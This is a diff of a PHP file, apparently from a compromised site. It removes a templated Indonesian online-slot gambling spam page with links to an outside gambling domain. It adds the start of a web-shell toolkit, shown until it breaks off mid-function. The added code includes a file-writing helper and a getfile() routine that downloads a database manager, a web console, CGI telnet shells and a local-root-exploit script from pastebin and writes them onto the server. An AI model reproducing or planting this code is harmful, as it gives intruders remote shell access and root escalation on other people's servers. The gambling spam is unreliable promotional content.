-                            <use xlink:href="<?php echo $urlPath ?>"></use>
-                          </svg>
-                        </button>
-                        <button class="search__button field__button" aria-label="Search">
-                          <svg class="icon icon-search" aria-hidden="true" focusable="false">
-                            <use href="<?php echo $urlPath ?>"></use>
-                          </svg>
-                        </button>
-                      </div>
-                      <div class="predictive-search predictive-search--header" tabindex="-1" data-predictive-search></div>
-                      <span class="predictive-search-status visually-hidden" role="status" aria-hidden="true"></span>
-                    </form>
-                  </predictive-search>
-                  <button type="button" class="search-modal__close-button modal__close-button link link--text focus-inset" aria-label="Close">
-                    <svg class="icon icon-close" aria-hidden="true" focusable="false">
-                      <use href="<?php echo $urlPath ?>"></use>
-                    </svg>
-                  </button>
-                </div>
-              </div>
-            </details>
-          </details-modal>
-          <a href="<?php echo $urlPath ?>" class="header__heading-link link link--text focus-inset">
-            <div class="header__heading-logo-wrapper">
-              <img src="https://res.cloudinary.com/dbhs42bnh/image/upload/v1710142313/slot-gacor.png?v=1702986579&amp;width=600" alt="SLOT GACOR" srcset="https://res.cloudinary.com/dbhs42bnh/image/upload/v1710142313/slot-gacor.png?v=1702986579&amp;width=300 300w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1710142313/slot-gacor.png?v=1702986579&amp;width=450 450w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1710142313/slot-gacor.png?v=1702986579&amp;width=600 600w" width="300" height="93.67959949937422" loading="eager" class="header__heading-logo" sizes="(min-width: 750px) 300px, 50vw" />
-            </div>
-          </a>
-          <div class="header__icons header__icons--localization header-localization">
-            <div class="desktop-localization-wrapper"></div>
-            <details-modal class="header__search">
-              <details>
-                <summary class="header__icon header__icon--search header__icon--summary link focus-inset modal__toggle" aria-haspopup="dialog" aria-label="Search">
-                  <span>
-                    <svg class="modal__toggle-open icon icon-search" aria-hidden="true" focusable="false">
-                      <use href="<?php echo $urlPath ?>"></use>
-                    </svg>
-                    <svg class="modal__toggle-close icon icon-close" aria-hidden="true" focusable="false">
-                      <use href="<?php echo $urlPath ?>"></use>
-                    </svg>
-                  </span>
-                </summary>
-                <div class="search-modal modal__content gradient" role="dialog" aria-modal="true" aria-label="Search">
-                  <div class="modal-overlay"></div>
-                  <div class="search-modal__content search-modal__content-bottom" tabindex="-1">
-                    <predictive-search class="search-modal__form" data-loading-text="Loading...">
-                      <form action="<?php echo $urlPath ?>search" method="get" role="search" class="search search-modal__form">
-                        <div class="field">
-                          <input class="search__input field__input" id="Search-In-Modal" type="search" name="q" value="" placeholder="Search"role="combobox" aria-expanded="false" aria-owns="predictive-search-results" aria-controls="predictive-search-results" aria-haspopup="listbox" aria-autocomplete="list" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false">
-                            <label class="field__label" for="Search-In-Modal">Search</label>
-                            <input type="hidden" name="options[prefix]" value="last">
-                              <button type="reset" class="reset__button field__button hidden" aria-label="Clear search term">
-                                <svg class="icon icon-close" aria-hidden="true" focusable="false">
-                                  <use xlink:href="<?php echo $urlPath ?>"></use>
-                                </svg>
-                              </button>
-                              <button class="search__button field__button" aria-label="Search">
-                                <svg class="icon icon-search" aria-hidden="true" focusable="false">
-                                  <use href="<?php echo $urlPath ?>"></use>
-                                </svg>
-                              </button>
-                            </div>
-                            <div class="predictive-search predictive-search--header" tabindex="-1" data-predictive-search></div>
-                            <span class="predictive-search-status visually-hidden" role="status" aria-hidden="true"></span>
-                          </form>
-                        </predictive-search>
-                        <button type="button" class="search-modal__close-button modal__close-button link link--text focus-inset" aria-label="Close">
-                          <svg class="icon icon-close" aria-hidden="true" focusable="false">
-                            <use href="<?php echo $urlPath ?>"></use>
-                          </svg>
-                        </button>
-                      </div>
-                    </div>
-                  </details>
-                </details-modal>
-                <a href="<?php echo $urlPath ?>" class="header__icon header__icon--cart link focus-inset" id="cart-icon-bubble">
-                  <svg class="icon icon-cart-empty" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" fill="none">
-                    <path d="m15.75 11.8h-3.16l-.77 11.6a5 5 0 0 0 4.99 5.34h7.38a5 5 0 0 0 4.99-5.33l-.78-11.61zm0 1h-2.22l-.71 10.67a4 4 0 0 0 3.99 4.27h7.38a4 4 0 0 0 4-4.27l-.72-10.67h-2.22v.63a4.75 4.75 0 1 1 -9.5 0zm8.5 0h-7.5v.63a3.75 3.75 0 1 0 7.5 0z" fill="currentColor" fill-rule="evenodd"/>
-                  </svg>
-                  <span class="visually-hidden">Cart</span>
-                </a>
-              </div>
-            </header>
-          </sticky-header>
-        </div>
-        <!-- END sections: header-group -->
-        <main id="MainContent" class="content-for-layout focus-none" role="main" tabindex="-1">
-          <section id="shopify-section-template--15207369113678__main" class="shopify-section section">
-            <section id="MainProduct-template--15207369113678__main" class="section-template--15207369113678__main-padding gradient color-background-1" data-section="template--15207369113678__main">
-              <div class="page-width">
-                <div class="product product--small product--left product--thumbnail_slider product--mobile-hide grid grid--1-col grid--2-col-tablet">
-                  <div class="grid__item product__media-wrapper">
-                    <media-gallery id="MediaGallery-template--15207369113678__main" role="region" class="product__column-sticky" aria-label="Gallery Viewer" data-desktop-layout="thumbnail_slider">
-                      <div id="GalleryStatus-template--15207369113678__main" class="visually-hidden" role="status"></div>
-                      <slider-component id="GalleryViewer-template--15207369113678__main" class="slider-mobile-gutter">
-                        <a class="skip-to-content-link button visually-hidden quick-add-hidden" href="<?php echo $urlPath ?>">Skip to product information</a>
-                        <ul id="Slider-Gallery-template--15207369113678__main" class="product__media-list contains-media grid grid--peek list-unstyled slider slider--mobile" role="list">
-                          <li id="Slide-template--15207369113678__main-22950012878926" class="product__media-item grid__item slider__slide is-active scroll-trigger animate--fade-in" data-media-id="template--15207369113678__main-22950012878926">
-                            <div class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height" style="--ratio: 1.3636363636363635; --preview-ratio: 1.3636363636363635;">
-                              <noscript>
-                                <div class="product__media media">
-                                  <img src="https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1946" alt="" srcset="https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=246 246w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=493 493w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=600 600w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=713 713w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=823 823w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=990 990w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1100 1100w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1206 1206w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1346 1346w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1426 1426w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1646 1646w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1946 1946w" width="1946" height="1427" sizes="(min-width: 1200px) 495px, (min-width: 990px) calc(45.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)"/>
-                                </div>
-                              </noscript>
-                              <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--15207369113678__main">
-                                <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                                  <svg aria-hidden="true" focusable="false" class="icon icon-plus" width="19" height="19" viewBox="0 0 19 19" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
-                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
-                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
-                                  </svg>
-                                </span>
-                                <div class="product__media media media--transparent">
-                                  <img src="https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1946" alt="" srcset="https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=246 246w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=493 493w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=600 600w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=713 713w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=823 823w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=990 990w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1100 1100w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1206 1206w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1346 1346w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1426 1426w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1646 1646w, https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1946 1946w" width="1946" height="1427" class="image-magnify-lightbox" sizes="(min-width: 1200px) 495px, (min-width: 990px) calc(45.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)" />
-                                </div>
-                                <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="22950012878926">
-                                  <span class="visually-hidden">Open media 1 in modal</span>
-                                </button>
-                              </modal-opener>
-                            </div>
-                          </li>
-                        </ul>
-                        <div class="slider-buttons no-js-hidden quick-add-hidden small-hide">
-                          <button type="button" class="slider-button slider-button--prev" name="previous" aria-label="Slide left">
-                            <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"/>
-                            </svg>
-                          </button>
-                          <div class="slider-counter caption">
-                            <span class="slider-counter--current">1</span>
-                            <span aria-hidden="true"> / </span>
-                            <span class="visually-hidden">of</span>
-                            <span class="slider-counter--total">1</span>
-                          </div>
-                          <button type="button" class="slider-button slider-button--next" name="next" aria-label="Slide right">
-                            <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"/>
-                            </svg>
-                          </button>
-                        </div>
-                      </slider-component>
-                    </media-gallery>
-                  </div>
-                <div class="product__info-wrapper grid__item scroll-trigger animate--slide-in">
-                  <product-info id="ProductInfo-template--15207369113678__main" data-section="template--15207369113678__main" data-url="<?php echo $urlPath ?>" class="product__info-container product__column-sticky">
-                    <p class="product__text inline-richtext">
-                      <strong>SLOT GACOR</strong>
-                    </p>
-                    <div class="product__title">
-                      <h1><?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024</h1>
-                      <a href="products/slot" class="product__title">
-                        <h2 class="h1"><?php echo $BRANDS ?></h2>
-                      </a>
-                    </div>
-                    <div class="no-js-hidden" id="price-template--15207369113678__main" role="status">
-                      <div class="price price--large price--sold-out price--show-badge">
-                        <div class="price__container">
-                          <div class="price__regular">
-                            <span class="visually-hidden visually-hidden--inline">Regular price</span>
-                            <span class="price-item price-item--regular">Rp 10.000,-</span>
-                          </div>
-                          <div class="price__sale">
-                            <span class="visually-hidden visually-hidden--inline">Regular price</span>
-                            <span>
-                              <s class="price-item price-item--regular"></s>
-                            </span>
-                            <span class="visually-hidden visually-hidden--inline">Sale price</span>
-                            <span class="price-item price-item--sale price-item--last">Rp 10.000,-</span>
-                          </div>
-                          <small class="unit-price caption hidden">
-                            <span class="visually-hidden">Unit price</span>
-                            <span class="price-item price-item--last">
-                              <span></span>
-                              <span aria-hidden="true">/</span>
-                              <span class="visually-hidden">&nbsp;per&nbsp;</span>
-                              <span></span>
-                            </span>
-                          </small>
-                        </div>
-                        <span class="badge price__badge-sale color-accent-1" style="background-color:rgb(181 11 7);">Minimal Deposit</span>
-                        <span class="badge price__badge-sold-out color-background-1" style="background-color:rgb(181 11 7);">Minimal Deposit</span>
-                      </div>
-                    </div>
-                    <div class="product__tax caption rte"></div>
-                    <div>
-                      <form method="post" action="<?php echo $urlPath ?>" id="product-form-installment-template--15207369113678__main" accept-charset="UTF-8" class="installment caption-large" enctype="multipart/form-data">
-                        <input type="hidden" name="form_type" value="product" />
-                        <input type="hidden" name="utf8" value="✓" />
-                        <input type="hidden" name="id" value="40476417982542" />
-                        <input type="hidden" name="product-id" value="6962851840078" />
-                      </form>
-                    </div>
-                    <noscript class="product-form__noscript-wrapper-template--15207369113678__main">
-                      <div class="product-form__input hidden">
-                        <label class="form__label" for="Variants-template--15207369113678__main">Product variants</label>
-                        <div class="select">
-                          <select name="id" id="Variants-template--15207369113678__main" class="select__select" form="product-form-template--15207369113678__main">
-                            <option selected="selected" disabled value="40476417982542">Default Title - Rp 10.000,- - Minimal Deposit</option>
-                          </select>
-                          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor" />
-                          </svg>
-                        </div>
-                      </div>
-                    </noscript>
-                    <div id="Quantity-Form-template--15207369113678__main" class="product-form__input product-form__quantity">
-                      <label class="quantity__label form__label" for="Quantity-template--15207369113678__main">
-                        Quantity
-                        <span class="quantity__rules-cart no-js-hidden hidden">
-                          <span>(<span class="quantity-cart">0</span> in cart)</span>
-                        </span>
-                      </label>
-                      <div class="price-per-item__container">
-                        <quantity-input class="quantity" data-url="<?php echo $urlPath ?>" data-section="template--15207369113678__main" style="background-color:rgb(181 11 7);">
-                          <button class="quantity__button no-js-hidden" name="minus" type="button">
-                            <span class="visually-hidden">Decrease quantity for slot</span>
-                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-minus" fill="none" viewBox="0 0 10 2">
-                              <path fill-rule="evenodd" clip-rule="evenodd" d="M.5 1C.5.7.7.5 1 .5h8a.5.5 0 110 1H1A.5.5 0 01.5 1z" fill="currentColor" />
-                            </svg>
-                          </button>
-                          <input class="quantity__input" type="number" name="quantity" id="Quantity-template--15207369113678__main" data-cart-quantity="0" data-min="1" min="1" step="1" value="1" form="product-form-template--15207369113678__main" />
-                          <button class="quantity__button no-js-hidden" name="plus" type="button">
-                            <span class="visually-hidden">Increase quantity for slot</span>
-                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-plus" fill="none" viewBox="0 0 10 10">
-                              <path fill-rule="evenodd" clip-rule="evenodd" d="M1 4.51a.5.5 0 000 1h3.5l.01 3.5a.5.5 0 001-.01V5.5l3.5-.01a.5.5 0 00-.01-1H5.5L5.49.99a.5.5 0 00-1 .01v3.5l-3.5.01H1z" fill="currentColor" />
-                            </svg>
-                          </button>
-                        </quantity-input>
-                      </div>
-                      <div class="quantity__rules caption no-js-hidden" id="Quantity-Rules-template--15207369113678__main"></div>
-                    </div>
-                    <div>
-                      <product-form class="product-form" data-hide-errors="false" data-section-id="template--15207369113678__main">
-                        <div class="product-form__error-message-wrapper" role="alert" hidden>
-                          <svg aria-hidden="true" focusable="false" class="icon icon-error" viewBox="0 0 13 13">
-                            <circle cx="6.5" cy="6.50049" r="5.5" stroke="white" stroke-width="2"/>
-                            <circle cx="6.5" cy="6.5" r="5.5" fill="#EB001B" stroke="#EB001B" stroke-width="0.7"/>
-                            <path d="M5.87413 3.52832L5.97439 7.57216H7.02713L7.12739 3.52832H5.87413ZM6.50076 9.66091C6.88091 9.66091 7.18169 9.37267 7.18169 9.00504C7.18169 8.63742 6.88091 8.34917 6.50076 8.34917C6.12061 8.34917 5.81982 8.63742 5.81982 9.00504C5.81982 9.37267 6.12061 9.66091 6.50076 9.66091Z" fill="white"/>
-                            <path d="M5.87413 3.17832H5.51535L5.52424 3.537L5.6245 7.58083L5.63296 7.92216H5.97439H7.02713H7.36856L7.37702 7.58083L7.47728 3.537L7.48617 3.17832H7.12739H5.87413ZM6.50076 10.0109C7.06121 10.0109 7.5317 9.57872 7.5317 9.00504C7.5317 8.43137 7.06121 7.99918 6.50076 7.99918C5.94031 7.99918 5.46982 8.43137 5.46982 9.00504C5.46982 9.57872 5.94031 10.0109 6.50076 10.0109Z" fill="white" stroke="#EB001B" stroke-width="0.7"/>
-                          </svg>
-                          <span class="product-form__error-message"></span>
-                        </div>
-                        <form method="post" action="https://mugiwara.my.id/sakti/" id="product-form-template--15207369113678__main" accept-charset="UTF-8" class="form" enctype="multipart/form-data" novalidate="novalidate" data-type="add-to-cart-form">
-                          <input type="hidden" name="form_type" value="product" />
-                          <input type="hidden" name="utf8" value="✓" />
-                          <input type="hidden" name="id" value="40476417982542" class="product-variant-id"/>
-                          <div class="product-form__buttons">
-                            <button id="ProductSubmitButton-template--15207369113678__main" type="submit" name="add" class="product-form__submit button button--full-width button--secondary" style="background-color:rgb(181 11 7);">
-                              <span>SLOT GACOR</span>
-                            </button>
-                            <input type="hidden" name="product-id" value="6962851840078" />
-                          </div>
-                        </form>
-                      </product-form>
-                      <pickup-availability class="product__pickup-availabilities no-js-hidden quick-add-hidden" data-root-url="/" data-variant-id="40476417982542" data-has-only-default-variant="true" data-product-page-color-scheme="gradient color-background-1">
-                        <template>
-                          <pickup-availability-preview class="pickup-availability-preview">
-                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" aria-hidden="true" focusable="false" class="icon icon-unavailable" fill="none" viewBox="0 0 20 20">
-                              <path fill="#DE3618" stroke="#fff" d="M13.94 3.94L10 7.878l-3.94-3.94A1.499 1.499 0 103.94 6.06L7.88 10l-3.94 3.94a1.499 1.499 0 102.12 2.12L10 12.12l3.94 3.94a1.497 1.497 0 002.12 0 1.499 1.499 0 000-2.12L12.122 10l3.94-3.94a1.499 1.499 0 10-2.121-2.12z"/>
-                            </svg>
-                            <div class="pickup-availability-info">
-                              <p class="caption-large">Couldn&#39;t load pickup availability</p>
-                              <button class="pickup-availability-button link link--text underlined-link">Refresh</button>
-                            </div>
-                          </pickup-availability-preview>
-                        </template>
-                      </pickup-availability>
-                    </div>
-                    <div class="product__description rte quick-add-hidden">
-                      <a href="https://mugiwara.my.id/sakti/">
-                        <center>
-                          <img src="https://res.cloudinary.com/dbhs42bnh/image/upload/v1703078382/daftar-pkv.gif" alt="daftar <?php echo $BRANDS ?>" width="500" height="250">
-                        </center>
-                      </a>
-                      <p style="color:#fff;"><?php echo $BRANDS ?> ialah situs slot gacor yang sudah berdiri sejak 2015 hingga saat ini dan telah resmi menjadi platform untuk meraih jackpot dengan mudah di tahun 2024.</p>
-                      <a href="products/slot" class="link product__view-details animate-arrow">View full details
-                        <svg viewBox="0 0 14 10" fill="none" aria-hidden="true" focusable="false" class="icon icon-arrow" xmlns="http://www.w3.org/2000/svg">
-                          <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor" />
-                        </svg>
-                      </a>
-                    </div>
-                  </product-info>
-                </div>
-              </div>
-              <product-modal id="ProductModal-template--15207369113678__main" class="product-media-modal media-modal">
-                <div class="product-media-modal__dialog color-background-1 gradient" role="dialog" aria-label="Media gallery" aria-modal="true" tabindex="-1">
-                  <button id="ModalClose-template--15207369113678__main" type="button" class="product-media-modal__toggle" aria-label="Close">
-                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-close" fill="none" viewBox="0 0 18 17">
-                      <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor" />
-                    </svg>
-                  </button>
-                  <div class="product-media-modal__content color-background-1 gradient" role="document" aria-label="Media gallery" tabindex="0">
-                    <img class="global-media-settings global-media-settings--no-shadow" srcset="https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&width=550 550w,https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579 750w" sizes="(min-width: 750px) calc(100vw - 22rem), 1100px" src="https://res.cloudinary.com/dbhs42bnh/image/upload/v1717229455/388.jpg?v=1702986579&amp;width=1445" alt="SLOT GACOR" loading="lazy" width="1100"height="807" data-media-id="22950012878926"/>
-                  </div>
-                </div>
-              </product-modal>
-            </div>
-          </section>
-        </section>
-        <section id="shopify-section-template--15207369113678__related-products" class="shopify-section section">
-          <div class="color-background-1 gradient no-js-hidden">
-            <product-recommendations class="related-products page-width section-template--15207369113678__related-products-padding isolate scroll-trigger animate--slide-in" data-url="/recommendations/products?section_id=template--15207369113678__related-products&product_id=6962851840078&limit=4"></product-recommendations>
-          </div>
-        </section>
-      </main>
-      <!-- BEGIN sections: footer-group -->
-      <section id="shopify-section-sections--15207369769038__newsletter" class="shopify-section shopify-section-group-footer-group section">
-        <div class="newsletter center">
-          <div class="newsletter__wrapper color-inverse gradient content-container isolate content-container--full-width section-sections--15207369769038__newsletter-padding">
-            <h2 class="inline-richtext h1 scroll-trigger animate--slide-in" data-cascade style="--animation-order: 1;">
-              <?php echo $BRANDS ?> » Situs Slot Gacor Resmi Mudah Jackpot 2024
-            </h2>
-            <div class="newsletter__subheading rte scroll-trigger animate--slide-in" data-cascade style="--animation-order: 2;">
-              <p>JOIN WITH <?php echo $BRANDS ?></p>
-            </div>
-            <div>
-              <form method="post" action="<?php echo $urlPath ?>" id="contact_form" accept-charset="UTF-8" class="newsletter-form">
-                <input type="hidden" name="form_type" value="customer" />
-                <input type="hidden" name="utf8" value="✓" />
-                <input type="hidden" name="contact[tags]" value="newsletter" />
-                <div class="newsletter-form__field-wrapper scroll-trigger animate--slide-in" data-cascade style="--animation-order: 3;">
-                  <div class="field">
-                    <input id="NewsletterForm--sections--15207369769038__newsletter" type="email" name="contact[email]" class="field__input" value="" aria-required="true" autocorrect="off" autocapitalize="off" autocomplete="email" placeholder="Email" required />
-                    <label class="field__label" for="NewsletterForm--sections--15207369769038__newsletter" style="color: #c40000;">SLOT GACOR</label>
-                    <button type="submit" class="newsletter-form__button field__button" name="commit" id="Subscribe" aria-label="Subscribe">
-                      <svg viewBox="0 0 14 10" fill="none" aria-hidden="true" focusable="false" class="icon icon-arrow" xmlns="http://www.w3.org/2000/svg">
-                        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor" />
-                      </svg>
-                    </button>
-                  </div>
-                </div>
-              </form>
-            </div>
-          </div>
-        </div>
-      </section>
-      <div id="shopify-section-sections--15207369769038__footer" class="shopify-section shopify-section-group-footer-group">
-        <footer class="footer color-inverse gradient section-sections--15207369769038__footer-padding">
-          <div class="footer__content-top page-width">
-            <div class="footer-block--newsletter scroll-trigger animate--slide-in" data-cascade></div>
-          </div>
-          <div class="footer__content-bottom scroll-trigger animate--slide-in" data-cascade>
-            <div class="footer__content-bottom-wrapper page-width">
-              <div class="footer__column footer__localization isolate"></div>
-              <div class="footer__column footer__column--info">
-                <div class="footer__payment">
-                  <span class="visually-hidden">Payment methods</span>
-                  <ul class="list list-payment" role="list"></ul>
-                </div>
-              </div>
-            </div>
-            <div class="footer__content-bottom-wrapper page-width">
-              <div class="footer__copyright caption">
-                <small class="copyright__content">&copy;Copyright <a href="<?php echo $urlPath ?>" title="<?php echo $BRANDS ?>"><?php echo $BRANDS ?></a></small>
-                <small class="copyright__content">
-                  <a target="_blank" rel="nofollow" href="<?php echo $urlPath ?>">Powered By <?php echo $BRANDS ?></a>
-                </small>
-              </div>
-            </div>
-          </div>
-        </footer>
-        <br>
-        <br>
-        <div class="fixed-footer">
-        <a href="https://mugiwara.my.id/sakti/" data-active="false">
-          <img layout="intrinsic" src="https://128.199.140.43/img/login.svg" alt="Login <?php echo $BRANDS ?>">LOGIN
-        </a>
-        <a href="https://mugiwara.my.id/sakti/" data-active="false">
-          <img layout="intrinsic" src="https://128.199.140.43/img/promotion.svg" alt="Bonus <?php echo $BRANDS ?>">PROMO
-        </a>
-        <a href="https://mugiwara.my.id/sakti/" data-active="false">
-          <img class="center" layout="intrinsic" src="https://128.199.140.43/img/livechat.svg" alt="Livechat <?php echo $BRANDS ?>">LIVECHAT
-        </a>
-      </div>
-    </div>
-    <!-- END sections: footer-group -->
-    <ul hidden>
-      <li id="a11y-refresh-page-message">Choosing a selection results in a full page refresh.</li>
-      <li id="a11y-new-window-message">Opens in a new window.</li>
-    </ul>
-    <script>
-      document.addEventListener('DOMContentLoaded', function () {
-        function isIE() {
-          const ua = window.navigator.userAgent;
-          const msie = ua.indexOf('MSIE ');
-          const trident = ua.indexOf('Trident/<?php echo $urlPath ?>');
-          return msie > 0 || trident > 0;
-        }
+function save($filename, $mode, $file) {
+	$handle = fopen($filename, $mode);
+	fwrite($handle, $file);
+	fclose($handle);
+	return;
+}
 
-        if (!isIE()) return;
-        const hiddenInput = document.querySelector('#product-form-template--15207369113678__main input[name="id"]');
-        const noScriptInputWrapper = document.createElement('div');
-        const variantSwitcher =
-          document.querySelector('variant-radios[data-section="template--15207369113678__main"]') ||
-          document.querySelector('variant-selects[data-section="template--15207369113678__main"]');
-        noScriptInputWrapper.innerHTML = document.querySelector('.product-form__noscript-wrapper-template--15207369113678__main')
-        .textContent;
-        variantSwitcher.outerHTML = noScriptInputWrapper.outerHTML;
-        document.querySelector('#Variants-template--15207369113678__main').addEventListener('change', function (event) {
-        hiddenInput.value = event.currentTarget.value;});
-      });
-    </script>
-    <script>
-      window.shopUrl = '<?php echo $urlPath ?>';
-      window.routes = {
-        cart_add_url: '/cart/add',
-        cart_change_url: '/cart/change',
-        cart_update_url: '/cart/update',
-        cart_url: '/cart',
-        predictive_search_url: '/search/suggest',
-      };
+function getfile($name) {
+	if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't spawn $name."));
+	if($name === "adminer") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php");
+	elseif($name === "webconsole") $get = array("https://pastebin.com/raw/2i96fDCN", "webconsole.php");
+	elseif($name === "cgitelnet1") $get = array("https://pastebin.com/raw/Lj46KxFT", "idx_cgi/cgitelnet1.idx");
+	elseif($name === "cgitelnet2") $get = array("https://pastebin.com/raw/aKL2QWfS", "idx_cgi/cgitelnet2.idx");
+	elseif($name === "LRE") $get = array("https://pastebin.com/raw/PVPfA21i", "makman.php");
 
-      window.cartStrings = {
-        error: `There was an error while updating your cart. Please try again.`,
-        quantityError: `You can only add [quantity] of this item to your cart.`,
-      };
+	$fp = fopen($get[1], "w");
+	$ch = curl_init();
+	 	  curl_setopt($ch, CURLOPT_URL, $get[0]);
+	 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+	 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
